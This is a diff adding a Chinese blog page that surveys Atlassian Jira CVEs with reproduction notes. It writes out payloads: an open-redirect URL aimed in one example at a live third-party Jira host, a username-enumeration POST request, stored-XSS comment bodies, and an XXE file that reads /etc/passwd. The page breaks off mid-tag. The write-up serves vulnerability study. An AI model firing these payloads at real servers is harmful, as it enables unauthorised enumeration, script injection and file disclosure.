@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="陛下，您真是一位老太太">
+    <meta name="keyword"  content="undefined">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Atlassian Jira漏洞大杂烩 - caiqiqi
+        
+    </title>
+
+    <link rel="canonical" href="https://github.com/caiqiqi/2019/11/03/Atlassian-Jira漏洞大杂烩/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="http://cdn.staticfile.org/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">caiqiqi</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://github.com/caiqiqi/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#Atlassian" title="Atlassian">Atlassian</a>
+                        
+                          <a class="tag" href="/tags/#Jira" title="Jira">Jira</a>
+                        
+                    </div>
+                    <h1>Atlassian Jira漏洞大杂烩</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by nobody from nowhere on
+                        2019-11-03
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h3 id="Jira-url跳转漏洞-CVE-2017-9506"><a href="#Jira-url跳转漏洞-CVE-2017-9506" class="headerlink" title="Jira url跳转漏洞(CVE-2017-9506)"></a>Jira url跳转漏洞(CVE-2017-9506)</h3><p>受影响版本：<br>Jira &lt; 7.3.5</p>
+<p>jira安装参考：<a href="https://blog.csdn.net/caiqiiqi/article/details/89017806" target="_blank" rel="external">https://blog.csdn.net/caiqiiqi/article/details/89017806</a><br>安装jira-6.4.14版本：<br><a href="https://product-downloads.atlassian.com/software/jira/downloads/atlassian-jira-6.4.14.tar.gz" target="_blank" rel="external">https://product-downloads.atlassian.com/software/jira/downloads/atlassian-jira-6.4.14.tar.gz</a><br>漏洞点：<code>Atlassian OAuth plugin</code><br>漏洞测试方法：不需要登录的情况下，访问</p>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">https://%basepath%/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.nl</div></pre></td></tr></table></figure>
+<p>参考：<a href="http://dontpanic.42.nl/2017/12/there-is-proxy-in-your-atlassian.html" target="_blank" rel="external">http://dontpanic.42.nl/2017/12/there-is-proxy-in-your-atlassian.html</a><br><img src="https://img-blog.csdnimg.cn/20190425111156491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>根据文章中的描述，漏洞点在：IconUriServlet。<br>从jar包中找字符串：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">grep -irn <span class="string">"iconuri"</span> `find .|grep .jar`</div></pre></td></tr></table></figure>
+<p>也可以定位到<code>./atlassian-jira/WEB-INF/atlassian-bundled-plugins/atlassian-oauth-service-provider-plugin-1.9.8.jar</code>。<br>在<code>atlassian-jira-6.4.14-standalone/atlassian-jira/WEB-INF/atlassian-bundled-plugins/atlassian-oauth-service-provider-plugin-1.9.8.jar!/com/atlassian/oauth/serviceprovider/internal/servlet/user/IconUriServlet.class</code>的<code>doGet()</code>方法下断点。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190425114801201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>jira的特征：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">X-AUSERNAME: anonymous</div><div class="line">X-AUSERNAME: anonymous org:&quot;Amazon.com&quot;  -- For aws</div><div class="line">X-AUSERNAME: anonymous org:&quot;Microsoft Azure&quot; -- For Azure</div><div class="line">X-AUSERNAME: anonymous org:&quot;google&quot;  -- For Google</div></pre></td></tr></table></figure>
+<p>一些url跳转的例子：<br><a href="https://jira.majesco.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.baidu.com" target="_blank" rel="external">https://jira.majesco.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.baidu.com</a><br><img src="https://img-blog.csdnimg.cn/20190907120918637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
+<li><a href="https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739" target="_blank" rel="external">https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739</a></li>
+<li><a href="https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a" target="_blank" rel="external">https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a</a></li>
+<li><a href="https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326" target="_blank" rel="external">https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326</a></li>
+</ul>
+<p>cnnvd上发布了几个jira的漏洞，都是中低危的：<br><a href="https://mp.weixin.qq.com/s/cylzALSdMPud5-hXqo4mKA" target="_blank" rel="external">https://mp.weixin.qq.com/s/cylzALSdMPud5-hXqo4mKA</a><br>后来才看到这几个漏洞是Talos发现的：<br><a href="https://blog.talosintelligence.com/2019/09/vuln-spotlight-atlassian-jira-sept-19.html" target="_blank" rel="external">https://blog.talosintelligence.com/2019/09/vuln-spotlight-atlassian-jira-sept-19.html</a><br>大量jira的bug漏洞可以参考这里：<br><a href="https://jira.atlassian.com/browse/JRASERVER-69858?filter=13085" target="_blank" rel="external">https://jira.atlassian.com/browse/JRASERVER-69858?filter=13085</a><br>jira的各种REST API文档：<br><a href="https://docs.atlassian.com/software/jira/docs/api/REST/7.13.0/" target="_blank" rel="external">https://docs.atlassian.com/software/jira/docs/api/REST/7.13.0/</a></p>
+<h3 id="CVE-2019-3403：信息泄露（用户名枚举）"><a href="#CVE-2019-3403：信息泄露（用户名枚举）" class="headerlink" title="CVE-2019-3403：信息泄露（用户名枚举）"></a><a href="https://jira.atlassian.com/browse/JRASERVER-69242" target="_blank" rel="external">CVE-2019-3403</a>：信息泄露（用户名枚举）</h3><blockquote>
+<p>The /rest/api/2/user/picker rest resource in Jira before version 7.13.3, from version 8.0.0 before version 8.0.4, and from version 8.1.0 before version 8.1.1 allows remote attackers to enumerate usernames via an incorrect authorisation check.</p>
+</blockquote>
+<p>触发处在创建问题的时候，选择报告人：<br>参考：<a href="https://jira.atlassian.com/browse/JRASERVER-69787" target="_blank" rel="external">https://jira.atlassian.com/browse/JRASERVER-69787</a><br><img src="https://img-blog.csdnimg.cn/2019082710442119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还有其他地方都可以调用这个rest接口：<br><img src="https://img-blog.csdnimg.cn/20190827104850586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="提供正常登录凭据情况下"><a href="#提供正常登录凭据情况下" class="headerlink" title="提供正常登录凭据情况下"></a>提供正常登录凭据情况下</h4><p>可以通过模糊匹配搜索到相关用户的邮箱，及全名等<br><img src="https://img-blog.csdnimg.cn/20190827105338686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="未授权情况下"><a href="#未授权情况下" class="headerlink" title="未授权情况下"></a>未授权情况下</h4><p>对于没有搜索到到用户：<br><img src="https://img-blog.csdnimg.cn/20190827103933219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对于搜索到到用户：<br><img src="https://img-blog.csdnimg.cn/20190827104012386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以进行用户名枚举，不过一般wiki在内网的话，可能就是一个正常的功能。</p>
+<h3 id="CVE-2019-11584-XSS"><a href="#CVE-2019-11584-XSS" class="headerlink" title="CVE-2019-11584: XSS"></a><a href="https://jira.atlassian.com/browse/JRASERVER-69785" target="_blank" rel="external">CVE-2019-11584</a>: XSS</h3><blockquote>
+<p>The MigratePriorityScheme resource in Jira before version 8.3.2 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the priority icon url of an issue priority.</p>
+</blockquote>
+<h3 id="CVE-2019-11589-open-redirect"><a href="#CVE-2019-11589-open-redirect" class="headerlink" title="CVE-2019-11589: open redirect"></a><a href="https://jira.atlassian.com/browse/JRASERVER-69780" target="_blank" rel="external">CVE-2019-11589</a>: open redirect</h3><blockquote>
+<p>The ChangeSharedFilterOwner resource in Jira before version 7.13.6, from version 8.0.0 before version 8.2.3, and from version 8.3.0 before version 8.3.2 allows remote attackers to attack users, in some cases be able to obtain a user’s Cross-site request forgery (CSRF) token, via a open redirect vulnerability.</p>
+</blockquote>
+<h3 id="CVE-2019-8446：信息泄露（用户名枚举）"><a href="#CVE-2019-8446：信息泄露（用户名枚举）" class="headerlink" title="CVE-2019-8446：信息泄露（用户名枚举）"></a><a href="https://jira.atlassian.com/browse/JRASERVER-69777" target="_blank" rel="external">CVE-2019-8446</a>：信息泄露（用户名枚举）</h3><blockquote>
+<p>The /rest/issueNav/1/issueTable resource in Jira before version 8.3.2 allows remote attackers to enumerate usernames via an incorrect authorisation check.</p>
+</blockquote>
+<p>这个REST API是在issue Navigator中查询issue的时候用到的。<br><img src="https://img-blog.csdnimg.cn/20191001163550925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一般请求长这样：<br><img src="https://img-blog.csdnimg.cn/20191001163641830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>未复现成功：<br><img src="https://img-blog.csdnimg.cn/20190827112309650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>需要提供登录凭据：<br><img src="https://img-blog.csdnimg.cn/20190827114242340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>参考：<br><a href="https://jira.atlassian.com/browse/JRASERVER-41100" target="_blank" rel="external">https://jira.atlassian.com/browse/JRASERVER-41100</a></p>
+<p>后来参考talos的漏洞报告：<br><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0839" target="_blank" rel="external">https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0839</a><br>才知道这里的payload应该这样写：<br><figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/rest/issueNav/1/issueTable</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: jira.com</div><div class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">X-Atlassian-token</span>: no-check</div><div class="line"><span class="attribute">Cookie</span>: jira.editor.user.mode=wysiwyg; JSESSIONID=05A9A04CC5F6D76AAB77D054E4FD181C</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</div><div class="line"><span class="attribute">Content-Length</span>: 44</div><div class="line"></div><div class="line"><span class="bash">jql=project <span class="keyword">in</span> projectsLeadByUser(<span class="string">"your_username"</span>)</span></div></pre></td></tr></table></figure></p>
+<p>如果这个用户名存在，则会响应200，<br><img src="https://img-blog.csdnimg.cn/20191001161801331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>若不存在则会响应400。<br><img src="https://img-blog.csdnimg.cn/20191001161518655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>需要具有查询权限的账号。</p>
+<h3 id="CVE-2019-8444-存储型XSS"><a href="#CVE-2019-8444-存储型XSS" class="headerlink" title="CVE-2019-8444 存储型XSS"></a>CVE-2019-8444 存储型XSS</h3><p>影响版本：<br>&lt; 7.13.6,<br>8.0.0 &lt;= version  &lt; 8.3.2</p>
+<p>参考：<a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0833" target="_blank" rel="external">https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0833</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20191001163956721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>两种payload都是向：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/rest/api/2/issue/TEST-7/comment</span> HTTP/1.1</div><div class="line"><span class="attribute">Content-Type</span>: application/json</div><div class="line"></div><div class="line"><span class="bash">&#123;<span class="string">"body"</span>:<span class="string">"!image.png|width=\\\" onmouseover=alert(333);//!"</span>&#125;</span></div></pre></td></tr></table></figure>
+<p>第二种：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/rest/api/2/issue/TEST-7/comment</span> HTTP/1.1</div><div class="line"><span class="attribute">Content-Type</span>: application/json</div><div class="line"></div><div class="line"><span class="bash">&#123;<span class="string">"body"</span>:<span class="string">"!image.png|width=http://onmouseover=alert(42&amp;#x29;;//!"</span>&#125;</span></div></pre></td></tr></table></figure>
+<h3 id="CVE-2017-5983：-Jira-Workflow-Designer插件XXE-RCE"><a href="#CVE-2017-5983：-Jira-Workflow-Designer插件XXE-RCE" class="headerlink" title="CVE-2017-5983：[Jira]Workflow Designer插件XXE/RCE"></a>CVE-2017-5983：[Jira]Workflow Designer插件XXE/RCE</h3><p>官方公告：<br><a href="https://confluence.atlassian.com/jira/jira-security-advisory-2017-03-09-879243455.html" target="_blank" rel="external">https://confluence.atlassian.com/jira/jira-security-advisory-2017-03-09-879243455.html</a></p>
+<p>更多信息参考：<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5983" target="_blank" rel="external">https://nvd.nist.gov/vuln/detail/CVE-2017-5983</a><br><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201704-296" target="_blank" rel="external">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201704-296</a></p>
+<p>影响版本：</p>
+<p>4.2.4 &lt;= version &lt; 6.3.0</p>
+<p>漏洞描述：</p>
+<blockquote>
+<p>Atlassian JIRA Server 6.3.0之前的版本中的JIRA Workflow Designer插件存在安全漏洞，该漏洞源于程序没有正确的使用XML过滤器和反序列化转换器。远程攻击者可借助特制的序列化Java对象利用该漏洞执行任意代码，读取任意文件或造成拒绝服务。</p>
+</blockquote>
+<h3 id="CVE-2019-8442：-Jira-未授权敏感信息泄露"><a href="#CVE-2019-8442：-Jira-未授权敏感信息泄露" class="headerlink" title="CVE-2019-8442：[Jira]未授权敏感信息泄露"></a>CVE-2019-8442：[Jira]未授权敏感信息泄露</h3><p>只是urlrewrite，不是那种直接读文件的，所以如果请求jsp的话，不会返回源码。只能读到一些不敏感的配置文件，所以影响比较低。</p>
+<p>问题在于<code>CachingResourceDownloadRewriteRule</code>:</p>
+<p>CVE-2019-8442:<br><a href="https://jira.atlassian.com/browse/JRASERVER-69241" target="_blank" rel="external">https://jira.atlassian.com/browse/JRASERVER-69241</a></p>
+<p>官方描述：</p>
+<blockquote>
+<p>The CachingResourceDownloadRewriteRule class in Jira before version 7.13.4, and from version 8.0.0 before version 8.0.4, and from version 8.1.0 before version 8.1.1 allows remote attackers to access files in the Jira webroot under the META-INF directory via a lax path access check.</p>
+</blockquote>
+<p>CNNVD描述：</p>
+<blockquote>
+<p>Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。<br>Atlassian Jira 7.13.4之前版本、8.0.4之前版本和8.1.1之前版本中的CachingResourceDownloadRewriteRule类存在安全漏洞。远程攻击者可利用该漏洞访问Jira webroot中的文件。</p>
+</blockquote>
+<p>参考：<a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201905-896" target="_blank" rel="external">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201905-896</a></p>
+<p>插件下载：<br><a href="http://central.maven.org/maven2/org/tuckey/urlrewritefilter/4.0.3/urlrewritefilter-4.0.3.jar" target="_blank" rel="external">http://central.maven.org/maven2/org/tuckey/urlrewritefilter/4.0.3/urlrewritefilter-4.0.3.jar</a></p>
+<p>其实在lib目录下有。<br><code>UrlRewriteFilter</code> </p>
+<blockquote>
+<p>It is a very powerful tool just like Apache’s mod_rewrite.</p>
+</blockquote>
+<p>bug bounty作者描述漏洞细节：</p>
+<blockquote>
+<p>the application takes input from the user, and uses it to build a file path to which the user is forwarded. Since the user controls a part of that path, they may be able to direct themselves to sensitive files, like /META-INF/*, application code, or configuration files, which may contain passwords.</p>
+</blockquote>
+<p>只是把用户提供的url在服务端重写了一下，只能访问一些META-INFO目录下的配置文件，jsp的话不能访问源码。<br>参考：<a href="https://www.cnblogs.com/dennisit/p/3177108.html" target="_blank" rel="external">https://www.cnblogs.com/dennisit/p/3177108.html</a></p>
+<h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p><img src="https://note.youdao.com/yws/public/resource/ca959c3587574e3509cd034d8db985b7/xmlnote/WEBRESOURCEdb691a55e504e1cef56daa1623edaf9b/7750" alt=""></p>
+<p>然而并不能访问<code>WEB-INF</code>目录下的文件。<br><img src="https://note.youdao.com/yws/public/resource/ca959c3587574e3509cd034d8db985b7/xmlnote/WEBRESOURCE44af581a3d70fce9ae796f42ff2f6bb4/7759" alt=""></p>
+<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><p>jenkins的基础设施也存在这个问题：<br><a href="https://issues.jenkins-ci.org/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml" target="_blank" rel="external">https://issues.jenkins-ci.org/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml</a></p>
+<p><img src="https://note.youdao.com/yws/public/resource/ca959c3587574e3509cd034d8db985b7/xmlnote/WEBRESOURCE2adc80bcf61523c510f5310ddd137c12/7756" alt=""></p>
+<p>confluence之前爆过这个urlrewrite.xml的任意配置文件读取漏洞：<br><a href="https://www.exploit-db.com/exploits/39170" target="_blank" rel="external">https://www.exploit-db.com/exploits/39170</a><br>不过应该后来一起被修复了。<br>有人提供了一份<a href="https://github.com/moink635/mysource/blob/master/jira-project/jira-components/jira-core/src/main/java/com/atlassian/jira/plugin/webresource/CachingResourceDownloadRewriteRule.java">源码</a>，从注释里看，这里就是为了防止路径穿越的。<br><img src="https://note.youdao.com/yws/public/resource/ca959c3587574e3509cd034d8db985b7/xmlnote/WEBRESOURCE369459a54f315d3bb47ca0d7abbce772/7788" alt=""></p>
+<h3 id="CVE-2018-14383：-jira-“The-Scheduler”-app-5-1-3-for-Jira-allows-XXE"><a href="#CVE-2018-14383：-jira-“The-Scheduler”-app-5-1-3-for-Jira-allows-XXE" class="headerlink" title="CVE-2018-14383：[jira] “The Scheduler” app 5.1.3 for Jira allows XXE"></a>CVE-2018-14383：[jira] “The Scheduler” app 5.1.3 for Jira allows XXE</h3><p>参考：<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-14383" target="_blank" rel="external">https://nvd.nist.gov/vuln/detail/CVE-2018-14383</a><br><a href="https://www.compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2018-022_jira_plugin_the_scheduler.txt" target="_blank" rel="external">https://www.compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2018-022_jira_plugin_the_scheduler.txt</a></p>
+<p>安装插件：</p>
+<p><img src="https://img-blog.csdnimg.cn/20190815160557329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>引入xml文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Administration &gt; Add-ons &gt; Import Scheduled Issues</div></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190815160630366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> standalone=<span class="string">"yes"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE Document [</span></div><div class="line">	&lt;!ENTITY c SYSTEM "/etc/passwd"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">TheSchedulerBackup</span> <span class="attr">xmlns</span>=<span class="string">"http://www.tt.com.pl"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">BackupInformation</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">JiraVersion</span>&gt;</span>7.7.0<span class="tag">&lt;/<span class="name">JiraVersion</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">PluginVersion</span>&gt;</span>5.1.3<span class="tag">&lt;/<span class="name">PluginVersion</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">BackupVersion</span>&gt;</span>2.0<span class="tag">&lt;/<span class="name">BackupVersion</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">BackupCreator</span>&gt;</span>Administrator<span class="tag">&lt;/<span class="name">BackupCreator</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">BackupTime</span>&gt;</span>Jun 19, 2018 11:55:11 AM<span class="tag">&lt;/<span class="name">BackupTime</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">ExportType</span>&gt;</span>all<span class="tag">&lt;/<span class="name">ExportType</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">SkipDisabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">SkipDisabled</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">SkipInvalid</span>&gt;</span>false<span class="tag">&lt;/<span class="name">SkipInvalid</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">BackupInformation</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">TheSchedulerData</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">ScheduledIssueElement</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Compass Security Test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">[CUT]</div><div class="line">            <span class="tag">&lt;<span class="name">ParamElement</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">paramName</span>&gt;</span>description<span class="tag">&lt;/<span class="name">paramName</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">paramValue</span>&gt;</span>&amp;c;<span class="tag">&lt;/<span class="name">paramValue</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">ParamElement</span>&gt;</span></div><div class="line">[CUT]</div><div class="line">        <span class="tag">&lt;/<span class="name">ScheduledIssueElement</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">TheSchedulerData</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span 